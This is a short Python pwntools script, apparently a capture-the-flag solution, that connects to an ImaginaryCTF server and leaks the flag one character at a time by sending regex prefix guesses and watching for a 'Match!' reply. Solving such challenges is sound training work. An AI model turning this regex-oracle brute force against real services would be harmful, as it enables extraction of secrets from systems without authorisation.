#!/usr/bin/env python3

from pwn import *

# p = process(["python3", "./server.py"])
p = remote("puzzler7.imaginaryctf.org", 7000)

flag = 'ictf{'
reqs = 0

while '}' not in flag:
    for c in "abcdefghijklmnopqrstuvwxyz0123456789_}":
        rx = flag + c + ".*"
        p.recvuntil(': ')
        p.sendline(rx)
        reqs += 1
        print(rx)
        if b"Match!" in p.recvline():
            flag += c
            break
    print(flag)

print(reqs)
